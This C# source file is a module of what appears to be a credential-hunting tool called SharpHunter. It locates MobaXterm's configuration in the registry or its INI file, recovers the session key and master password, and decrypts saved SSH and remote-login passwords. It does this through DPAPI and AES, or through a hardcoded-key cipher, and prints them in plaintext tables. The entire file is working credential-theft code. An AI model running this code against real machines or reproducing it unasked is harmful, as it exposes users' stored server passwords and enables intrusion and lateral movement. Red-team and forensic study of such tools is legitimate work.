using Microsoft.Win32;
using SharpHunter.Utils;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Security.Cryptography;
using System.Text;

namespace SharpHunter.Commands
{
    public class MobaXtermCredCommand : ICommand
    {
        public struct Credentials
        {
            public string Name;
            public string Username;
            public string Password;
        }

        public struct Passwords
        {
            public string Protocol;
            public string Username;
            public string Servername;
            public string Password;
        }

        public class CredentialResult
        {
            public List<Credentials> Credentials { get; set; }
            public List<Passwords> Passwords { get; set; }

            public CredentialResult()
            {
                Credentials = new List<Credentials>();
                Passwords = new List<Passwords>();
            }
        }
        public void Execute(List<string> args)
        {
            Logger.TaskHeader("Cred Mode", 1);
            Logger.WriteLine("[*] Hunting MobaXterm credentials and passwords.");
            if (args.Count == 1)
            {
                string iniFilePath = args[0].ToString();
                GetMobaXtermCred(iniFilePath);
            }
            else
            {
                GetMobaXtermCred();
            }
        }
        public static void GetMobaXtermCred(string iniFilePath = null)
        {
            Logger.TaskHeader("Hunting MobaXterm", 1);
            CredentialResult result = new CredentialResult();
            if (!string.IsNullOrEmpty(iniFilePath))
            {
                Logger.WriteLine($"[*] Using provided INI file: {iniFilePath}");
                result = GetCredFromIniFile(iniFilePath);
            }
            else{
                string version = DetermineMobaXtermVersion();
                if (version == "Installer Edition")
                {
                    Logger.WriteLine("[*] MobaXterm Version: Installer Edition");
                    Logger.WriteLine("[*] Hunting credentials from the registry.");
                    result = GetCredFromRegistry();

                    if (result.Credentials.Count == 0 && result.Passwords.Count == 0)
                    {
                        Logger.WriteLine("[-] No credentials found in registry, trying INI file.");
                        if (!string.IsNullOrEmpty(iniFilePath))
                        {
                            Logger.WriteLine($"[*] INI file path: {iniFilePath}");
                            result = GetCredFromIniFile(iniFilePath);
                        }
                        else
                        {
                            iniFilePath = FindMobaXtermIniPath();
                            if (!string.IsNullOrEmpty(iniFilePath))
                            {
                                Logger.WriteLine($"[*] INI file path: {iniFilePath}");
                                result = GetCredFromIniFile(iniFilePath);
                            }
                            else
                            {
                                Logger.WriteLine("[-] MobaXterm.ini file not found.");
                            }
                        }
                    }
                }
                else if (version == "Portable Edition")
                {
                    Logger.WriteLine("[*] MobaXterm Version: Portable Edition");
                    if (!string.IsNullOrEmpty(iniFilePath))
                    {
                        Logger.WriteLine($"[*] Hunting from the INI file: {iniFilePath}");
                        result = GetCredFromIniFile(iniFilePath);
                    }
                    else
                    {
                        iniFilePath = FindMobaXtermIniPath();
                        if (!string.IsNullOrEmpty(iniFilePath))
                        {
                            Logger.WriteLine($"[*] Found INI file path: {iniFilePath}");
                            result = GetCredFromIniFile(iniFilePath);
                        }
                        else
                        {
                            Logger.WriteLine("[-] MobaXterm.ini file not found.");
                        }
                    }
                }
                else
                {
                    Logger.WriteLine("[-] MobaXterm not found.");
                    return;
                }
            }

            if (result.Credentials.Count > 0 || result.Passwords.Count > 0)
            {
                Logger.WriteLine($"[+] Hunt {result.Credentials.Count} Credentials, {result.Passwords.Count} Passwords: \n");
                if (result.Credentials.Count > 0)
                {
                    Logger.TaskHeader("Saved Credentials", 2);
                    List<string> credentialsHeader = new List<string> { "Name", "Username", "Password" };
                    List<List<string>> credentialsItems = result.Credentials.Select(c => new List<string> { c.Name, c.Username, c.Password }).ToList();
                    Logger.PrintTable(credentialsHeader, credentialsItems);
                    Logger.WriteLine("");
                }

                if (result.Passwords.Count > 0)
                {
                    Logger.TaskHeader("Saved Passwords", 2);
                    List<string> passwordsHeader = new List<string> { "Protocol", "Username", "Servername", "Password" };
                    List<List<string>> passwordsItems = result.Passwords.Select(p => new List<string> { p.Protocol, p.Username, p.Servername, p.Password }).ToList();
                    Logger.PrintTable(passwordsHeader, passwordsItems);
                }
            }
            else
            {
                Logger.WriteLine("[-] No MobaXterm credentials or passwords were found.");
            }
        }
        public static string FindMobaXtermIniPath()
        {
            // 安装版 MobaXterm.exe 便携版 MobaXterm_Personal_24.3.exe
            var processInfo = CommonUtils.GetProcessInfoByPattern(@"MobaXterm(_Personal)?(_\d+\.\d+)?");
            if (processInfo.HasValue)
            {
                string processFilePath = Path.Combine(Path.GetDirectoryName(processInfo.Value.FilePath), "MobaXterm.ini");
                if (File.Exists(processFilePath))
                {
                    return processFilePath;
                }
            }

            string[] potentialPaths = new string[]
            {
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "MobaXterm\\MobaXterm.ini"),
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments), "MobaXterm\\MobaXterm.ini")
            };

            foreach (var path in potentialPaths)
            {
                if (File.Exists(path))
                {
                    return path;
                }
            }
            return null;
        }

        public static string DetermineMobaXtermVersion()
        {
            const string registryPath = @"HKEY_CURRENT_USER\Software\Mobatek\MobaXterm";
            object installedValue = Registry.GetValue(registryPath, "installed", null);
            object sessionPValue = Registry.GetValue(registryPath, "SessionP", null);
            string iniFilePath = FindMobaXtermIniPath();

            // 检查是否存在 masterPassword
            string masterPassword = GetMasterPasswordFromRegistry();
            if ((installedValue != null && installedValue.ToString() == "1") || !string.IsNullOrEmpty(masterPassword))
            {
                return "Installer Edition";
            }
            else if ((installedValue != null && installedValue.ToString() == "0" && sessionPValue != null) || !string.IsNullOrEmpty(iniFilePath))
            {
                return "Portable Edition";
            }
            else
            {
                return "Not Found";
            }
        }

        private static void ParseIniFileForCredentialsAndPasswords(string[] lines, List<Credentials> credentials, List<Passwords> passwords, string sessionP, string masterPassword)
        {
            bool inCredentialsSection = false;
            bool inPasswordsSection = false;

            foreach (string line in lines)
            {
                if (line.StartsWith("[Credentials]"))
                {
                    inCredentialsSection = true;
                    inPasswordsSection = false;
                    continue;
                }
                if (line.StartsWith("[Passwords]"))
                {
                    inPasswordsSection = true;
                    inCredentialsSection = false;
                    continue;
                }
                if (line.StartsWith("[") && !line.StartsWith("[Credentials]") && !line.StartsWith("[Passwords]"))
                {
                    inCredentialsSection = false;
                    inPasswordsSection = false;
                }

                if (inCredentialsSection)
                {
                    int index = line.IndexOf('=');
                    if (index > 0)
                    {
                        string name = line.Substring(0, index).Trim();
                        string[] credParts = line.Substring(index + 1).Split(':');
                        if (credParts.Length == 2)
                        {
                            string decryptedPassword = string.IsNullOrEmpty(masterPassword)
                                ? DecryptWithoutMasterPassword(sessionP, credParts[1].Trim())
                                : DecryptWithMasterPassword(sessionP, masterPassword, credParts[1].Trim());
                            credentials.Add(new Credentials
                            {
                                Name = name,
                                Username = credParts[0].Trim(),
                                Password = decryptedPassword
                            });
                        }
                    }
                }

                if (inPasswordsSection)
                {
                    int index = line.IndexOf('=');
                    if (index > 0)
                    {
                        string name = line.Substring(0, index).Trim();
                        string[] nameParts = name.Split(':');
                        if (nameParts.Length == 2)
                        {
                            string[] userServerParts = nameParts[1].Split('@');
                            if (userServerParts.Length == 2)
                            {
                                string encryptedPassword = line.Substring(index + 1).Trim();
                                string decryptedPassword = string.IsNullOrEmpty(masterPassword)
                                    ? DecryptWithoutMasterPassword(sessionP, encryptedPassword)
                                    : DecryptWithMasterPassword(sessionP, masterPassword, encryptedPassword);
                                passwords.Add(new Passwords
                                {
                                    Protocol = nameParts[0].Trim(),
                                    Username = userServerParts[0].Trim(),
                                    Servername = userServerParts[1].Trim(),
                                    Password = decryptedPassword
                                });
                            }
                        }
                    }
                }
            }
        }

        public static CredentialResult GetCredFromIniFile(string iniFilePath)
        {
            CredentialResult result = new CredentialResult();

            if (!File.Exists(iniFilePath))
            {
                Logger.WriteLine("[-] MobaXterm.ini file not exists.");
                return result;
            }

            string[] lines = ReadAllLinesWithEncoding(iniFilePath);
            string sessionP = GetSessionPFromIniFile(lines); 
            string masterPassword = GetMasterPasswordFromIniFile(lines);

            if (string.IsNullOrEmpty(sessionP))
            {
                Logger.WriteLine("[-] SessionP is empty, cannot decrypt credentials.");
                return result;
            }


            if (string.IsNullOrEmpty(masterPassword))
            {
                Logger.WriteLine("[-] MasterPassword is empty, using DecryptWithoutMasterPassword.");
                ParseIniFileForCredentialsAndPasswords(lines, result.Credentials, result.Passwords, sessionP, null);
            }
            else
            {
                ParseIniFileForCredentialsAndPasswords(lines, result.Credentials, result.Passwords, sessionP, masterPassword);
            }
            if (result.Credentials.Count == 0 && result.Passwords.Count == 0)
            {
                Logger.WriteLine("[-] No credentials found in INI file, trying registry.");
                ParseRegistryForCredentialsAndPasswords(result, sessionP, masterPassword);
            }

            return result;
        }

        public static string[] ReadAllLinesWithEncoding(string path)
        {
            return File.ReadAllLines(path, Encoding.GetEncoding("GBK"));
        }

        private static void ParseRegistryForCredentialsAndPasswords(CredentialResult result, string sessionP, string masterPassword)
        {
            using (RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Software\Mobatek\MobaXterm\C"))
            {
                if (key != null)
                {
                    foreach (string subKeyName in key.GetValueNames())
                    {
                        string value = key.GetValue(subKeyName) as string;
                        if (value != null)
                        {
                            string[] parts = value.Split(':');
                            if (parts.Length == 2)
                            {
                                //string decryptedPassword = DecryptWithMasterPassword(sessionP, masterPassword, parts[1]);
                                string decryptedPassword = string.IsNullOrEmpty(masterPassword)
                                    ? DecryptWithoutMasterPassword(sessionP, parts[1])
                                    : DecryptWithMasterPassword(sessionP, masterPassword, parts[1]);
                                result.Credentials.Add(new Credentials
                                {
                                    Name = subKeyName,
                                    Username = parts[0].Trim(),
                                    Password = decryptedPassword
                                });
                            }
                        }
                    }
                }
            }

            using (RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Software\Mobatek\MobaXterm\P"))
            {
                if (key != null)
                {
                    foreach (string subKeyName in key.GetValueNames())
                    {
                        string value = key.GetValue(subKeyName) as string;
                        if (value != null)
                        {
                            string[] nameParts = subKeyName.Split(':');
                            if (nameParts.Length == 2)
                            {
                                string[] userServerParts = nameParts[1].Split('@');
                                if (userServerParts.Length == 2)
                                {
                                    //string decryptedPassword = DecryptWithMasterPassword(sessionP, masterPassword, value);
                                    string decryptedPassword = string.IsNullOrEmpty(masterPassword)
                                        ? DecryptWithoutMasterPassword(sessionP, value)
                                        : DecryptWithMasterPassword(sessionP, masterPassword, value);
                                    result.Passwords.Add(new Passwords
                                    {
                                        Protocol = nameParts[0].Trim(),
                                        Username = userServerParts[0].Trim(),
                                        Servername = userServerParts[1].Trim(),
                                        Password = decryptedPassword
                                    });
                                }
                            }
                        }
                    }
                }
            }
        }
        public static CredentialResult GetCredFromRegistry()
        {
            CredentialResult result = new CredentialResult();
            string sessionP = GetSessionPFromRegistry();
            string masterPassword = GetMasterPasswordFromRegistry();

            if (string.IsNullOrEmpty(sessionP))
            {
                Logger.WriteLine("[-] SessionP is empty, cannot decrypt credentials.");
                return result;
            }

            if (string.IsNullOrEmpty(masterPassword))
            {
                Logger.WriteLine("[-] MasterPassword is empty, using DecryptWithoutMasterPassword.");
                ParseRegistryForCredentialsAndPasswords(result, sessionP, null);
            }
            else
            {
                ParseRegistryForCredentialsAndPasswords(result, sessionP, masterPassword);
            }

            if (result.Credentials.Count == 0 && result.Passwords.Count == 0)
            {
                Logger.WriteLine("[-] No credentials found in registry, trying INI file.");
                string iniFilePath = FindMobaXtermIniPath();
                if (!string.IsNullOrEmpty(iniFilePath))
                {
                    Logger.WriteLine($"[*] INI file path: {iniFilePath}");
                    string[] lines = ReadAllLinesWithEncoding(iniFilePath);
                    ParseIniFileForCredentialsAndPasswords(lines, result.Credentials, result.Passwords, sessionP, masterPassword);
                }
                else
                {
                    Logger.WriteLine("[-] MobaXterm.ini file not found.");
                }
            }
            return result;
        }
        private static readonly byte[] DpapiHeader = { 0x01, 0x00, 0x00, 0x00, 0xd0, 0x8c, 0x9d, 0xdf, 0x01, 0x15, 0xd1, 0x11, 0x8c, 0x7a, 0x00, 0xc0, 0x4f, 0xc2, 0x97, 0xeb };

        public static string DecryptWithMasterPassword(string sessionP, string masterPassword, string ciphertext)
        {
            byte[] masterPasswordBytes = Convert.FromBase64String(masterPassword);

            byte[] fullEncryptedData = new byte[DpapiHeader.Length + masterPasswordBytes.Length];
            Buffer.BlockCopy(DpapiHeader, 0, fullEncryptedData, 0, DpapiHeader.Length);
            Buffer.BlockCopy(masterPasswordBytes, 0, fullEncryptedData, DpapiHeader.Length, masterPasswordBytes.Length);

            byte[] temp = ProtectedData.Unprotect(
                fullEncryptedData,
                Encoding.UTF8.GetBytes(sessionP),
                DataProtectionScope.CurrentUser
            );

            string temp2 = Encoding.UTF8.GetString(temp);
            byte[] output = Convert.FromBase64String(temp2);

            byte[] aesKey = new byte[32];
            Array.Copy(output, aesKey, 32);

            byte[] ivBytes = AES.Encrypt(new byte[16], aesKey);
            byte[] iv = new byte[16];
            Array.Copy(ivBytes, iv, 16);

            byte[] cipherBytes = Convert.FromBase64String(ciphertext);
            string plaintext = AES.Decrypt(cipherBytes, aesKey, iv);
            return plaintext;
        }

        public static string DecryptWithoutMasterPassword(string sessionP, string ciphertext)
        {
            StringBuilder sessionPBuilder = new StringBuilder(sessionP);
            while (sessionPBuilder.Length < 20)
            {
                sessionPBuilder.Append(sessionPBuilder);
            }
            sessionP = sessionPBuilder.ToString().Substring(0, 20);

            string s2 = (Environment.UserName + Environment.UserDomainName)
                .PadRight(20, ' ')
                .Substring(0, 20);

            string[] keySpace = { sessionP.ToUpper(), sessionP.ToLower() };

            byte[] key = Encoding.UTF8.GetBytes("0d5e9n1348/U2+67");
            string validCharacters = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz+/";

            for (int i = 0; i < key.Length; i++)
            {
                char potentialKeyChar = keySpace[(i + 1) % keySpace.Length][i % 20];
                if (!key.Contains((byte)potentialKeyChar) && validCharacters.Contains(potentialKeyChar))
                {
                    key[i] = (byte)potentialKeyChar;
                }
            }

            HashSet<byte> keySet = new HashSet<byte>(key);
            List<byte> filteredText = new List<byte>();

            foreach (byte t in Encoding.ASCII.GetBytes(ciphertext))
            {
                if (keySet.Contains(t))
                {
                    filteredText.Add(t);
                }
            }

            byte[] ct = filteredText.ToArray();
            List<byte> ptArray = new List<byte>();

            if (ct.Length % 2 == 0)
            {
                for (int i = 0; i < ct.Length; i += 2)
                {
                    int l = Array.IndexOf(key, ct[i]);
                    key = RotateRightBytes(key);
                    int h = Array.IndexOf(key, ct[i + 1]);
                    key = RotateRightBytes(key);
                    ptArray.Add((byte)(16 * h + l));
                }

                return Encoding.UTF8.GetString(ptArray.ToArray());
            }

            return string.Empty;

            byte[] RotateRightBytes(byte[] input)
            {
                byte[] rotatedBytes = new byte[input.Length];
                Array.Copy(input, 0, rotatedBytes, 1, input.Length - 1);
                rotatedBytes[0] = input[input.Length - 1];
                return rotatedBytes;
            }
        }


        private static string GetSessionPFromIniFile(string[] lines)
        {
            foreach (var line in lines)
            {
                if (line.StartsWith("SessionP="))
                {
                    string sessionP = line.Substring("SessionP=".Length).Trim();
                    return sessionP;
                }
            }
            Logger.WriteLine("[-] SessionP not found in INI file.");
            return null;
        }

        private static string GetMasterPasswordFromIniFile(string[] lines)
        {
            bool inSesspassSection = false;
            string searchKey = (Environment.UserName + "@" + Environment.MachineName).Replace(" ", "");
            foreach (var line in lines)
            {
                if (line.StartsWith("[Sesspass]"))
                {
                    inSesspassSection = true;
                    continue;
                }
                else if (inSesspassSection && string.IsNullOrEmpty(line.Trim()))
                {
                    inSesspassSection = false;
                }
                else if (inSesspassSection)
                {
                    int index = line.IndexOf('=');
                    if (index > 0)
                    {
                        string name = line.Substring(0, index).Trim();
                        if (name.Equals(searchKey, StringComparison.OrdinalIgnoreCase))
                        {
                            string masterPassword = line.Substring(index + 1).Trim();
                            return masterPassword;
                        }
                    }
                }
            }
            Logger.WriteLine("[-] MasterPassword not found in INI file.");
            return null;
        }
        private static string GetMasterPasswordFromRegistry()
        {
            using (RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Software\Mobatek\MobaXterm\M"))
            {
                if (key != null)
                {
                    foreach (string valueName in key.GetValueNames())
                    {
                        string value = key.GetValue(valueName) as string;
                        if (!string.IsNullOrEmpty(value))
                        {
                            return value;
                        }
                    }
                }
                return null; 
            }
        }
        private static string GetSessionPFromRegistry()
        {
            using (RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Software\Mobatek\MobaXterm"))
            {
                if (key != null)
                {
                    return key.GetValue("SessionP") as string;
                }
                Logger.WriteLine("[-] SessionP not found in registry.");
                return null;
            }
        }
    }
}